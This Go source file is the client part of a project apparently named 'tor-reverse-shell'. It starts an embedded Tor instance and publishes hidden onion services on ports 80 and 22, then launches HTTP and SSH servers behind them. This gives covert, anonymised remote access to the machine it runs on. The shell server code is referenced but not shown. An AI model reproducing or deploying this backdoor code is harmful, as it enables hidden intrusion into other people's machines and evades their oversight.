package client

import (
	"fmt"

	"github.com/cretz/bine/tor"
	"github.com/humbertovnavarro/tor-reverse-shell/pkg/config"
	"github.com/humbertovnavarro/tor-reverse-shell/pkg/tor_engine"
	"github.com/ipsn/go-libtor"
)

var torStartConf = &tor.StartConf{
	ProcessCreator: libtor.Creator,
	DebugWriter:    nil,
	DataDir:        fmt.Sprintf("%s/%s", config.UserDir, "tor"),
}

func Start() error {
	config := &tor_engine.TorEngineConf{
		Start: torStartConf,
	}
	torEngine := tor_engine.New(config, OnTorConnect)
	err := torEngine.Start()
	if err != nil {
		panic(err)
	}
	return nil
}

func OnTorConnect(e *tor_engine.TorEngine) {
	fmt.Println("tor connected")
	httpOnion, err := e.NewOnionListener(&tor.ListenConf{
		RemotePorts: []int{80},
		Version3:    true,
		Detach:      false,
	})
	if err != nil {
		panic(err)
	}
	sshOnion, err := e.NewOnionListener(&tor.ListenConf{
		RemotePorts: []int{22},
		Version3:    true,
		Detach:      false,
	})
	if err != nil {
		panic(err)
	}
	ch := make(chan error)
	go StartHTTPServer(httpOnion, e, ch)
	go StartSSHServer(sshOnion, ch)
	err = <-ch
	if err != nil {
		panic(err)
	}
}
